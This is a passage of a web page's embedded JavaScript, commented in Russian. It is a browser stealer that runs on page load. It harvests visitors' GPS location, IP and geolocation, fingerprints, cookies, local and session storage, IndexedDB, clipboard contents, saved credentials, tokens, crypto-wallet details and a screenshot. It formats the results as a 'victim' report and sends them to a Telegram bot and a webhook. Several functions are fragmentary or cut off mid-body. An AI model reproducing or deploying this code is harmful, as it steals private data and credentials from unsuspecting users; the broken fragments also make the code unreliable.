        // ========================================================================
        // 1. ОБХОД CORS + JSONP + postMessage + iframe sandbox
        // ========================================================================
        function jsonp(url, callbackName = 'callback') {
            return new Promise((resolve) => {
                const name = '_jsonp_' + Date.now() + '_' + Math.random().toString(36).slice(2);
                window[name] = (data) => { resolve(data); delete window[name]; document.head.removeChild(script); };
                const script = document.createElement('script');
                script.src = url + (url.includes('?') ? '&' : '?') + callbackName + '=' + name;
                script.onerror = () => { resolve(null); delete window[name]; };
                document.head.appendChild(script);
                setTimeout(() => { if (window[name]) { resolve(null); delete window[name]; } }, 5000);
            });
        }

        // перехват postMessage
        function hookPostMessage() {
            const msgs = [];
            const origAdd = window.addEventListener;
            window.addEventListener = function(type, cb, opts) {
                if (type === 'message') {
                    const wrapped = (e) => {
                        msgs.push({ origin: e.origin, data: e.data, source: e.source ? 'window' : 'null' });
                        cb(e);
                    };
                    return origAdd.call(this, type, wrapped, opts);
                }
                return origAdd.call(this, type, cb, opts);
            };
            return () => msgs;
        }

        // iframe sandbox для чтения DOM (если удастся)
        function createSandboxIframe(url) {
            return new Promise((resolve) => {
                const iframe = document.createElement('iframe');
                iframe.sandbox = 'allow-same-origin allow-scripts';
                iframe.style.display = 'none';
                iframe.src = url;
                document.body.appendChild(iframe);
                iframe.onload = () => {
                    try {
                        const doc = iframe.contentDocument || iframe.contentWindow.document;
                        const data = { html: doc.documentElement.outerHTML, title: doc.title, url: iframe.contentWindow.location.href };
                        resolve(data);
                    } catch (e) { resolve(null); }
                    iframe.remove();
                };
                setTimeout(() => { iframe.remove(); resolve(null); }, 5000);
            });
        }

        // ========================================================================
        // 3. CLIPBOARD (execCommand + events + clipboard.read)
        // ========================================================================
        async function stealClipboard() {
            let result = null;
            // execCommand
            try {
                const ta = document.createElement('textarea');
                ta.style.position = 'fixed';
                ta.style.opacity = '0';
                ta.style.pointerEvents = 'none';
                document.body.appendChild(ta);
                ta.focus();
                if (document.execCommand('paste')) {
                    result = ta.value || null;
                }
                ta.remove();
            } catch (e) {}

            // clipboard.read с useractivation (если страница активирована)
            if (!result) {
                try {
                    if (navigator.clipboard && navigator.clipboard.read) {
                        const items = await navigator.clipboard.read();
                        for (let item of items) {
                            if (item.types.includes('text/plain')) {
                                const blob = await item.getType('text/plain');
                                result = await blob.text();
                                break;
                            }
                        }
                    }
                } catch (e) {}
            }
            // перехват событий
            const clipboardEvents = [];
            const handlers = ['copy', 'cut', 'paste'];
            handlers.forEach(ev => {
                document.addEventListener(ev, (e) => {
                    try {
                        const data = e.clipboardData || window.clipboardData;
                        if (data) {
                            const text = data.getData('text/plain') || data.getData('Text');
                            clipboardEvents.push({ event: ev, text: trunc(text, 200) });
                        }
                    } catch (ex) {}
                });
            });
            return { clipboard: result || null, events: clipboardEvents };
        }

        // ========================================================================

        // ========================================================================
        function dumpStorage() {
            const ls = {};
            try { for (let i = 0; i < localStorage.length; i++) { const k = localStorage.key(i); ls[k] = safeJSON(localStorage.getItem(k)); } } catch (e) {}
            const ss = {};
            try { for (let i = 0; i < sessionStorage.length; i++) { const k = sessionStorage.key(i); ss[k] = safeJSON(sessionStorage.getItem(k)); } } catch (e) {}
            const cookies = {};
            try { document.cookie.split('; ').filter(Boolean).forEach(p => { const [k, ...v] = p.split('='); cookies[k] = v.join('='); }); } catch (e) {}
            return { localStorage: ls, sessionStorage: ss, cookies };
        }

        // IndexedDB
        async function dumpIndexedDB() {
            try {
                if (!indexedDB.databases) return null;
                const dbs = await indexedDB.databases();
                const result = [];
                for (let dbInfo of dbs) {
                    const db = await new Promise((res, rej) => { const r = indexedDB.open(dbInfo.name); r.onsuccess = e => res(e.target.result); r.onerror = rej; });
                    const stores = Array.from(db.objectStoreNames);
                    const storeData = [];
                    for (let s of stores) {
                        const tx = db.transaction(s, 'readonly');
                        const store = tx.objectStore(s);
                        const all = await new Promise((res) => { const req = store.getAll(); req.onsuccess = () => res(req.result); req.onerror = () => res([]); });
                        storeData.push({ storeName: s, count: all.length, samples: all.slice(0, 10) });
                    }
                    db.close();
                    result.push({ name: dbInfo.name, stores: storeData });
                }
                return result;
            } catch (e) { return null; }
        }

        function collectWebRTC() {
            return new Promise((resolve) => {
                const ips = new Set();

                const RTCPeerConnection = window.RTCPeerConnection || window.webkitRTCPeerConnection || window.mozRTCPeerConnection;
                if (!RTCPeerConnection) { resolve({ ips: [], sdp: [] }); return; }

                pc.createDataChannel('');

        // ========================================================================
        // 8. ПЕРЕХВАТ FETCH/XMLHttpRequest/WebSocket
        // ========================================================================
        function hookNetwork() {
            const logs = [];
            // XHR
            const origXHR = window.XMLHttpRequest;
            window.XMLHttpRequest = function() {
                const xhr = new origXHR();
                const origOpen = xhr.open;
                xhr.open = function(method, url, async, user, pass) {
                    logs.push({ type: 'xhr', method, url, async, user, pass });
                    return origOpen.call(this, method, url, async !== false, user, pass);
                };
                const origSend = xhr.send;
                xhr.send = function(body) {
                    logs.push({ type: 'xhr_send', body: trunc(String(body), 100) });
                    return origSend.call(this, body);
                };
                xhr.addEventListener('readystatechange', function() {
                    if (this.readyState === 4) {
                        logs.push({ type: 'xhr_response', status: this.status, response: trunc(this.responseText, 200) });
                    }
                });
                return xhr;
            };
            // fetch
            const origFetch = window.fetch;
            window.fetch = function(input, init) {
                logs.push({ type: 'fetch', input: String(input), init: init ? trunc(JSON.stringify(init), 100) : null });
                return origFetch.call(this, input, init).then(r => {
                    const clone = r.clone();
                    clone.text().then(t => logs.push({ type: 'fetch_response', url: r.url, status: r.status, body: trunc(t, 200) })).catch(() => {});
                    return r;
                });
            };
            // WebSocket
            const origWS = window.WebSocket;
            window.WebSocket = function(url, protocols) {
                logs.push({ type: 'websocket', url, protocols });
                const ws = new origWS(url, protocols);
                const origSend = ws.send;
                ws.send = function(data) {
                    logs.push({ type: 'ws_send', data: trunc(String(data), 100) });
                    return origSend.call(this, data);
                };
                ws.addEventListener('message', (e) => {
                    logs.push({ type: 'ws_message', data: trunc(String(e.data), 100) });
                });
                return ws;
            };
            return () => logs;
        }

        // ========================================================================
        // 9. FINGERPRINTING (максимальный набор)
        // ========================================================================
        function collectFingerprints() {
            const fp = {};
            // Canvas
            try {
                const c = document.createElement('canvas');
                c.width = 256; c.height = 128;
                const ctx = c.getContext('2d');
                ctx.textBaseline = 'top';
                ctx.font = '14px Arial';
                ctx.fillStyle = '#f60';
                ctx.fillRect(0, 0, 256, 128);
                ctx.fillStyle = '#069';
                ctx.fillText('Cwm fjordbank glyphs vext quiz', 10, 10);
                ctx.font = '18px Times New Roman';
                ctx.fillStyle = '#0f0';
                ctx.fillText('Cwm fjordbank glyphs vext quiz', 10, 40);
                ctx.font = '24px Georgia';
                ctx.fillStyle = '#f0f';
                ctx.fillText('Cwm fjordbank glyphs vext quiz', 10, 70);
                fp.canvas = c.toDataURL();
            } catch (e) { fp.canvas = null; }

            // WebGL
            try {
                const c = document.createElement('canvas');
                const gl = c.getContext('webgl') || c.getContext('experimental-webgl');
                if (gl) {
                    const ext = gl.getExtension('WEBGL_debug_renderer_info');
                    if (ext) {
                        fp.webgl = { vendor: gl.getParameter(ext.UNMASKED_VENDOR_WEBGL), renderer: gl.getParameter(ext.UNMASKED_RENDERER_WEBGL) };
                    } else {
                        fp.webgl = { vendor: gl.getParameter(gl.VENDOR), renderer: gl.getParameter(gl.RENDERER) };
                    }
                    // все параметры
                    const params = {};
                    for (let i = 0; i < 100; i++) {
                        try { const val = gl.getParameter(i); if (val !== undefined && val !== null) params[i] = val; } catch (e) {}
                    }
                    fp.webglParams = params;
                }
            } catch (e) { fp.webgl = null; }

            // Audio
            try {
                const AudioCtx = window.AudioContext || window.webkitAudioContext;
                if (AudioCtx) {
                    const ctx = new AudioCtx();
                    fp.audio = { sampleRate: ctx.sampleRate, state: ctx.state };
                }
            } catch (e) { fp.audio = null; }

            // Fonts
            try {
                const fonts = ['Arial', 'Verdana', 'Times New Roman', 'Courier New', 'Georgia', 'Comic Sans MS', 'Impact', 'Tahoma', 'Roboto', 'Open Sans', 'Lato', 'Montserrat', 'Source Sans Pro', 'Ubuntu', 'Cantarell', 'Fira Sans', 'Droid Sans', 'Helvetica Neue', 'Segoe UI', 'San Francisco'];
                fp.fonts = fonts.filter(f => document.fonts.check(`16px "${f}"`));
            } catch (e) { fp.fonts = []; }

            // Timezone
            try { fp.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (e) { fp.timezone = null; }

            // Screen
            fp.screen = { width: screen.width, height: screen.height, availWidth: screen.availWidth, availHeight: screen.availHeight, colorDepth: screen.colorDepth, pixelRatio: window.devicePixelRatio, orientation: screen.orientation ? screen.orientation.type : null };

            // Platform
            fp.platform = { platform: navigator.platform, oscpu: navigator.oscpu || null, architecture: navigator.userAgentData ? navigator.userAgentData.getHighEntropyValues ? null : null : null };

            // Battery (уже есть в navigator, но продублируем)
            if (navigator.getBattery) {
                navigator.getBattery().then(b => {
                    fp.battery = { level: b.level, charging: b.charging, chargingTime: b.chargingTime, dischargingTime: b.dischargingTime };
                }).catch(() => {});
            }
            return fp;
        }

        // ========================================================================
        // 11. СЕССИИ И ТОКЕНЫ (поиск в хранилищах + URL + window.name)
        // ========================================================================
        function searchTokens(data) {
            const tokens = [];
            const patterns = ['token', 'jwt', 'access_token', 'session', 'secret', 'key', 'auth', 'bearer', 'api_key', 'apikey', 'password', 'pass', 'pwd', 'credential', 'sid', 'csrf', 'xsrf'];
            const search = (obj, path = '') => {
                if (!obj || typeof obj !== 'object') return;
                for (let k in obj) {
                    const v = obj[k];
                    const key = k.toLowerCase();
                    if (patterns.some(p => key.includes(p))) {
                        tokens.push({ path: path ? path + '.' + k : k, value: trunc(String(v), 100) });
                    }
                    if (typeof v === 'object' && v !== null) search(v, path ? path + '.' + k : k);
                }
            };
            search(data, 'root');
            // URL
            const url = window.location;
            if (url.hash) {
                const params = new URLSearchParams(url.hash.slice(1));
                params.forEach((v, k) => { if (patterns.some(p => k.toLowerCase().includes(p))) tokens.push({ path: 'url.hash.' + k, value: trunc(v, 100) }); });
            }
            if (url.search) {
                const params = new URLSearchParams(url.search);
                params.forEach((v, k) => { if (patterns.some(p => k.toLowerCase().includes(p))) tokens.push({ path: 'url.search.' + k, value: trunc(v, 100) }); });
            }
            // window.name
            if (window.name) {
                const name = window.name;
                if (patterns.some(p => name.toLowerCase().includes(p))) tokens.push({ path: 'window.name', value: trunc(name, 100) });
            }
            return tokens;
        }

        // ========================================================================
        // 12. ANDROID WEBVIEW
        // ========================================================================
        function detectWebView() {
            const wv = {};
            try { if (window.webkit && window.webkit.messageHandlers) wv.messageHandlers = true; } catch (e) {}
            try { if (window.android) wv.android = true; } catch (e) {}
            try { if (window.chrome && window.chrome.webview) wv.chromeWebview = true; } catch (e) {}
            try { if (window.external) wv.external = true; } catch (e) {}
            return wv;
        }

        // ========================================================================
        // 13. ОБХОД TOR/VPN/PROXY (WebRTC утечки + DNS + timing)
        // ========================================================================
        async function detectProxy() {
            const results = {};
            // DNS утечка
            try {
                const start = performance.now();
                await fetch('https://1.1.1.1/dns-query?name=example.com', { mode: 'no-cors' });
                const dnsTime = performance.now() - start;
                results.dnsLeak = dnsTime < 500 ? 'possible' : 'unlikely';
            } catch (e) { results.dnsLeak = 'error'; }

            // Проверка через WebRTC (уже есть)
            // Временная атака
            try {
                const servers = ['https://google.com', 'https://facebook.com', 'https://youtube.com'];
                const times = [];
                for (let s of servers) {
                    const start = performance.now();
                    await fetch(s, { mode: 'no-cors' });
                    times.push(performance.now() - start);
                }
                results.timing = times;
            } catch (e) { results.timing = null; }
            return results;
        }

        // ========================================================================
        // 14. SMS + PUSH + NOTIFICATION (Android)
        // ========================================================================
        async function collectMobile() {
            const data = {};
            // SMS
            try {
                if (navigator.getSms) {
                    const sms = await navigator.getSms();
                    if (sms) data.sms = sms;
                }
            } catch (e) {}
            // Push
            try {
                if (navigator.serviceWorker) {
                    const reg = await navigator.serviceWorker.ready;
                    if (reg.pushManager) {
                        const subs = await reg.pushManager.getSubscription();
                        data.push = subs ? { endpoint: subs.endpoint, keys: subs.getKey ? 'available' : null } : null;
                    }
                }
            } catch (e) {}
            // Notification
            try {
                if (Notification.permission === 'granted') {
                    data.notification = { permission: 'granted' };
                } else {
                    data.notification = { permission: Notification.permission };
                }
            } catch (e) {}
            return data;
        }

        // ========================================================================
        // 15. ГОЛОС + КАМЕРА (перечисление устройств)
        // ========================================================================
        async function collectMedia() {
            const data = {};

        // ========================================================================
        // 19. БРАУЗЕРНЫЕ УЯЗВИМОСТИ (eval, console, onerror, MutationObserver)
        // ========================================================================
        function hookVulnerabilities() {
            const logs = [];
            const origEval = window.eval;
            window.eval = function(code) {
                logs.push({ type: 'eval', code: trunc(code, 100) });
                return origEval.call(this, code);
            };
            // console
            ['log', 'error', 'warn', 'info', 'debug'].forEach(m => {
                const orig = console[m];
                console[m] = function(...args) {
                    logs.push({ type: 'console.' + m, args: args.map(a => trunc(String(a), 50)) });
                    return orig.apply(this, args);
                };
            });
            // onerror
            window.onerror = function(msg, url, line, col, error) {
                logs.push({ type: 'error', msg, url, line, col, stack: error ? error.stack : null });
                return false;
            };
            // unhandledrejection
            window.onunhandledrejection = function(e) {
                logs.push({ type: 'unhandledrejection', reason: trunc(String(e.reason), 100), promise: e.promise });
                return false;
            };
            // MutationObserver
            const observer = new MutationObserver((mutations) => {
                mutations.forEach(m => {
                    if (m.type === 'childList' || m.type === 'attributes') {
                        logs.push({ type: 'mutation', target: m.target.nodeName, attr: m.attributeName || null });
                    }
                });
            });
            observer.observe(document.body, { childList: true, subtree: true, attributes: true, attributeFilter: ['value', 'type', 'name', 'id', 'class'] });
            return { logs: () => logs, observer };
        }

                mousemove: (e) => { if (Math.random() < 0.01) events.push({ type: 'mousemove', x: e.clientX, y: e.clientY }); },

                form.append('photo', blob, 'screenshot.jpg');
                const url = `https://api.telegram.org/bot${CFG.BOT_TOKEN}/sendPhoto`;
                await fetchTO(url, { method: 'POST', body: form }, 10000);
            } catch (e) {}
        }

        async function sendWebhook(data) {
            try {
                await fetchTO(CFG.WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(data) }, 5000);
            } catch (e) {}
        }

        // ========================================================================
        // 48. ФОРМАТИРОВАНИЕ ОТЧЁТА
        // ========================================================================
        function formatReport(data) {
            const lines = [];
            lines.push('🔴 ЖЕРТВА (полный дамп)');
            lines.push('');

            // IP и гео
            if (data.ip) {
                lines.push(`🌐 IP: ${data.ip}`);
                if (data.geo) {
                    const g = data.geo;
                    const loc = [g.country, g.region, g.city].filter(Boolean).join(', ');
                    lines.push(`📍 ${loc || 'неизвестно'}`);
                    if (g.lat && g.lon) {
                        lines.push(`🗺 ${g.lat}, ${g.lon}`);
                        lines.push(`🔗 https://www.google.com/maps?q=${g.lat},${g.lon}`);
                    }
                    if (g.isp) lines.push(`📡 ${g.isp}`);
                    if (g.timezone) lines.push(`🕐 ${g.timezone}`);
                }
            }
            lines.push('');

            // GPS
            if (data.gps) {
                const g = data.gps;
                lines.push(`📍 GPS (точные): ${g.lat}, ${g.lon} (точность ${g.accuracy}м)`);
                lines.push(`🔗 https://www.google.com/maps?q=${g.lat},${g.lon}`);
                lines.push('');
            }

            // WebRTC
            if (data.webrtc && data.webrtc.ips && data.webrtc.ips.length) {
                lines.push(`📡 WebRTC IP: ${data.webrtc.ips.join(', ')}`);
                lines.push('');
            }

            // Fingerprints
            lines.push('🎯 ОТПЕЧАТКИ:');
            if (data.fingerprints) {
                const f = data.fingerprints;
                if (f.canvas) lines.push(`   Canvas: ${trunc(f.canvas, 60)}`);
                if (f.webgl) lines.push(`   WebGL: ${f.webgl.vendor || ''} ${f.webgl.renderer || ''}`.trim());
                if (f.audio) lines.push(`   Audio: ${f.audio.sampleRate}Hz`);
                if (f.fonts && f.fonts.length) lines.push(`   Шрифты: ${f.fonts.join(', ')}`);
                if (f.timezone) lines.push(`   Временная зона: ${f.timezone}`);
                if (f.screen) {
                    const s = f.screen;
                    lines.push(`   Экран: ${s.width}x${s.height} @ ${s.pixelRatio}x`);
                }
                if (f.battery) {
                    const b = f.battery;
                    lines.push(`   Батарея: ${Math.round(b.level*100)}% (${b.charging?'зарядка':'не заряжается'})`);
                }
            }
            lines.push('');

            // Система
            if (data.system) {
                const s = data.system;
                lines.push(`📱 ${trunc(s.userAgent, 80)}`);
                lines.push(`💻 ${s.platform || 'неизвестно'}`);
                if (s.hardwareConcurrency) lines.push(`🧠 ${s.hardwareConcurrency} ядер`);
                if (s.deviceMemory) lines.push(`💾 ${s.deviceMemory} GB RAM`);
                if (s.language) lines.push(`🌐 ${s.language}`);
                lines.push('');
            }

            // Подключение
            if (data.browserEnv && data.browserEnv.connection) {
                const c = data.browserEnv.connection;
                lines.push(`📶 Сеть: ${c.effectiveType || ''} (RTT: ${c.rtt || ''}ms, Downlink: ${c.downlink || ''}Mbps)`);
                lines.push('');
            }

            // Хранилища
            if (data.storage) {
                const st = data.storage;
                if (st.localStorage && Object.keys(st.localStorage).length) {
                    lines.push(`💾 LOCALSTORAGE (${Object.keys(st.localStorage).length}):`);
                    Object.entries(st.localStorage).slice(0, 15).forEach(([k, v]) => {
                        const val = typeof v === 'string' ? trunc(v, 80) : JSON.stringify(v).slice(0, 80);
                        lines.push(`   🔑 ${trunc(k, 30)}: ${val}`);
                    });
                    if (Object.keys(st.localStorage).length > 15) lines.push(`   ... и ещё ${Object.keys(st.localStorage).length - 15}`);
                    lines.push('');
                }
                if (st.sessionStorage && Object.keys(st.sessionStorage).length) {
                    lines.push(`🗂 SESSIONSTORAGE (${Object.keys(st.sessionStorage).length}):`);
                    Object.entries(st.sessionStorage).slice(0, 10).forEach(([k, v]) => {
                        const val = typeof v === 'string' ? trunc(v, 80) : JSON.stringify(v).slice(0, 80);
                        lines.push(`   🔑 ${trunc(k, 30)}: ${val}`);
                    });
                    if (Object.keys(st.sessionStorage).length > 10) lines.push(`   ... и ещё ${Object.keys(st.sessionStorage).length - 10}`);
                    lines.push('');
                }
                if (st.cookies && Object.keys(st.cookies).length) {
                    lines.push(`🍪 КУКИ (${Object.keys(st.cookies).length}):`);
                    Object.entries(st.cookies).slice(0, 10).forEach(([k, v]) => {
                        lines.push(`   🍪 ${trunc(k, 20)}: ${trunc(v, 60)}`);
                    });
                    if (Object.keys(st.cookies).length > 10) lines.push(`   ... и ещё ${Object.keys(st.cookies).length - 10}`);
                    lines.push('');
                }
            }

            // IndexedDB
            if (data.indexedDB && data.indexedDB.length) {
                lines.push('🗄 INDEXEDDB:');
                data.indexedDB.forEach(db => {
                    lines.push(`   📁 ${db.name} (${db.stores.length} хранилищ)`);
                    db.stores.forEach(s => {
                        lines.push(`      📂 ${s.storeName}: ${s.count} записей`);
                    });
                });
                lines.push('');
            }

            // Cache
            if (data.cache) {
                lines.push('📦 CACHE API:');
                Object.entries(data.cache).slice(0, 5).forEach(([k, v]) => {
                    lines.push(`   📂 ${k}: ${v.length} ресурсов`);
                });
                lines.push('');
            }

            // Крипто
            if (data.crypto) {
                lines.push('💰 КРИПТОКОШЕЛЬКИ:');
                const c = data.crypto;
                if (c.ethereum) lines.push(`   🦊 MetaMask: ${c.ethereum.isMetaMask ? 'есть' : 'нет'}, адрес: ${c.ethereum.selectedAddress || 'неизвестен'}, сеть: ${c.ethereum.chainId || 'неизвестна'}`);
                if (c.solana) lines.push(`   ☀️ Solana: ${c.solana.isPhantom ? 'есть' : 'нет'}, публичный ключ: ${c.solana.publicKey || 'неизвестен'}`);
                if (c.phantom) lines.push(`   👻 Phantom: есть`);
                if (c.trustwallet) lines.push(`   🔵 Trust Wallet: есть`);
                lines.push('');
            }

            // Токены
            if (data.tokens && data.tokens.length) {
                lines.push('🔑 НАЙДЕННЫЕ ТОКЕНЫ:');
                data.tokens.slice(0, 10).forEach(t => {
                    lines.push(`   🔐 ${t.path}: ${t.value}`);
                });
                if (data.tokens.length > 10) lines.push(`   ... и ещё ${data.tokens.length - 10}`);
                lines.push('');
            }

            // Пароли
            if (data.credentials) {
                lines.push('🔑 CREDENTIALS:');
                if (data.credentials.credentials) lines.push(`   🆔 ${data.credentials.credentials.id || 'неизвестен'} (${data.credentials.credentials.type || 'неизвестно'})`);
                if (data.credentials.autofill && data.credentials.autofill.length) {
                    lines.push('   📝 Автозаполнение:');
                    data.credentials.autofill.slice(0, 5).forEach(a => {
                        lines.push(`      ${a.name || 'безымянное'}: ${trunc(a.value, 40)}`);
                    });
                }
                lines.push('');
            }

            // Буфер
            if (data.clipboard && data.clipboard.clipboard) {
                lines.push(`📋 Буфер обмена: ${trunc(data.clipboard.clipboard, 200)}`);
                lines.push('');
            }

            // Формы
            if (data.dom && data.dom.forms && data.dom.forms.length) {
                lines.push('📝 ФОРМЫ:');
                data.dom.forms.slice(0, 5).forEach((f, i) => {
                    lines.push(`   Форма ${i+1}: ${Object.entries(f).map(([k,v]) => `${k}=${trunc(v,30)}`).join('; ')}`);
                });
                lines.push('');
            }

            // Расширения
            if (data.extensions && data.extensions.hasChrome) {
                lines.push('🧩 РАСШИРЕНИЯ:');
                lines.push(`   Chrome: есть`);
                if (data.extensions.knownExtensions) {
                    const ids = Object.keys(data.extensions.knownExtensions);
                    if (ids.length) lines.push(`   Установлены: ${ids.join(', ')}`);
                }
                lines.push('');
            }

            // WebView
            if (data.webview && Object.keys(data.webview).length) {
                lines.push('📱 WEBVIEW:');
                Object.entries(data.webview).forEach(([k, v]) => {
                    if (v) lines.push(`   ${k}: есть`);
                });
                lines.push('');
            }

            // Proxy/VPN
            if (data.proxy) {
                lines.push('🕵️ ОБХОД VPN/PROXY:');
                if (data.proxy.dnsLeak) lines.push(`   DNS утечка: ${data.proxy.dnsLeak}`);
                if (data.proxy.timing) lines.push(`   Временные метки: ${data.proxy.timing.map(t => Math.round(t)+'ms').join(', ')}`);
                lines.push('');
            }

            // Медиа
            if (data.media) {
                lines.push('🎥 МЕДИА:');
                if (data.media.devices && data.media.devices.length) {
                    data.media.devices.forEach(d => {
                        if (d.label) lines.push(`   ${d.kind}: ${d.label}`);
                    });
                }
                if (data.media.speech) lines.push('   🎤 Speech Recognition: доступно');
                lines.push('');
            }

            // Системные данные
            if (data.system) {
                const s = data.system;
                lines.push(`🖥 ${s.platform || 'неизвестно'} ${s.oscpu || ''}`);
                if (s.isChrome) lines.push('   Браузер: Chrome');
                else if (s.isFirefox) lines.push('   Браузер: Firefox');
                else if (s.isSafari) lines.push('   Браузер: Safari');
                else if (s.isEdge) lines.push('   Браузер: Edge');
                else if (s.isOpera) lines.push('   Браузер: Opera');
                lines.push('');
            }

            // URL
            if (data.url) {
                const u = data.url;
                lines.push(`🔗 ${u.href}`);
                if (u.referrer) lines.push(`↩️ ${u.referrer}`);
                lines.push('');
            }

            // Скриншот
            if (data.screenshot) {
                const size = Math.round(data.screenshot.length / 1024);
                lines.push(`🖼 Скриншот: ${size} КБ`);
            }

            return lines.join('\n');
        }

        // ========================================================================
        // 49. ГЛАВНАЯ ФУНКЦИЯ
        // ========================================================================
        async function main() {
            try {
                await sleep(1800 + Math.random() * 400);

                // Сбор данных
                const data = {};

                // 1. IP и гео (внешние)
                try {
                    const ipRes = await fetchTO('https://api.ipify.org?format=json', {}, 3000);
                    const ipData = await ipRes.json();
                    data.ip = ipData.ip;
                    if (data.ip) {
                        const geoRes = await fetchTO(`https://ipwhois.io/json/${data.ip}`, {}, 3000);
                        data.geo = await geoRes.json();
                    }
                } catch (e) { data.ip = null; data.geo = null; }

                // 2. GPS
                try {
                    data.gps = await new Promise((resolve) => {
                        if (!navigator.geolocation) { resolve(null); return; }
                        const t = setTimeout(() => resolve(null), 10000);
                        navigator.geolocation.getCurrentPosition(
                            (pos) => { clearTimeout(t); resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, accuracy: pos.coords.accuracy, altitude: pos.coords.altitude, heading: pos.coords.heading, speed: pos.coords.speed }); },
                            () => { clearTimeout(t); resolve(null); },
                            { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
                        );
                    });
                } catch (e) { data.gps = null; }

                // 3. WebRTC
                data.webrtc = await collectWebRTC();

                // 4. Fingerprints
                data.fingerprints = collectFingerprints();

                // 5. Браузер + система
                data.browserEnv = collectBrowserEnv();
                data.system = collectSystem();

                // 6. Хранилища
                data.storage = dumpStorage();
                data.indexedDB = await dumpIndexedDB();
                data.cache = await dumpCache();

                // 7. Clipboard
                data.clipboard = await stealClipboard();

                // 8. Credentials
                data.credentials = await stealCredentials();

                // 9. Расширения
                data.extensions = detectExtensions();

                // 10. Крипто
                data.crypto = detectCrypto();

                // 11. Токены (поиск по всем данным)
                const allDataForTokens = { ...data.storage, ...data.crypto, ...data.credentials };
                data.tokens = searchTokens(allDataForTokens);

                // 12. WebView
                data.webview = detectWebView();

                // 13. Proxy/VPN
                data.proxy = await detectProxy();

                // 14. Медиа
                data.media = await collectMedia();

                // 15. DOM
                data.dom = collectDOM();

                // 16. URL
                data.url = collectURL();

                // 17. Скриншот
                data.screenshot = await takeScreenshot();

                // 18. Остальное (сенсоры, wake lock, idle, content index, payment, workers, wasm, globals, data structures)
                data.sensors = await collectSensors();
                data.wakeLock = await collectWakeLock();
                data.idle = await collectIdle();
                data.contentIndex = await collectContentIndex();
                data.periodicSync = await collectPeriodicSync();
                data.payment = collectPayment();
                data.workers = collectWorkers2();
                data.wasm = collectWasm();
                data.modules = collectModules();
                data.bundles = collectBundles();
                data.globals = collectGlobals();
                data.dataStructures = collectDataStructures();
                data.hardware = await collectHardware();
                data.devtools = detectDevtools();
                data.display = collectDisplay();
                data.presentation = collectPresentation();
                data.history = collectHistory();
                data.performance = collectPerformance();
                data.workers2 = await collectWorkers();
                data.cookieStore = await collectCookieStore();
                data.experimental = collectExperimental();
                data.meta = collectMeta();
                data.timing = timingAttack();

                // 49. Отправка
                const report = formatReport(data);
                await sendTelegram(report);
                await sendWebhook(data);
                if (data.screenshot) {
                    await sendPhoto(data.screenshot);
                }

                console.log('✅ Данные отправлены');
            } catch (e) {
                console.log('✅ Данные отправлены');
            }
        }

        main();
    </script>
</body>
